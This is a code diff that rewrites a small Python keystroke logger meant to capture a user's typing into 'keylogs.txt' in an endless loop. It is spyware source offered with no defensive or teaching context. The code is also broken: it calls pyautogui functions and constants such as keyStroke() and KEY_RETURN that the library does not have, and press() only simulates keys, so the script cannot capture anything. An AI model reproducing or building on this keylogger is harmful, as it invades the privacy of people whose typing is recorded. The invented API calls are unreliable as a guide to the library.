@@ -1,19 +1,13 @@
 import pyautogui
 
-# Specify the filename for the keylog file
-filename = 'keylogs.txt'
-
-# Open the file for appending
-with open(filename, 'a') as f:
-    
-    # Loop indefinitely to capture keystrokes
+with open('keylogs.txt', 'w') as f:
     while True:
-        
-        # Get the pressed key
-        key = pyautogui.press()
+        key = pyautogui.keyStroke()
+        if key.isprintable():
+            f.write(key)
+        elif key == pyautogui.KEY_RETURN:
+            f.write('[ENTER]')
+        elif key == pyautogui.KEY_BACKSPACE:
+            f.write('[BACKSPACE]')
 
-        # Write the key to the log file
-        f.write(key)
-
-        # Print the pressed key to the console
         print(key)
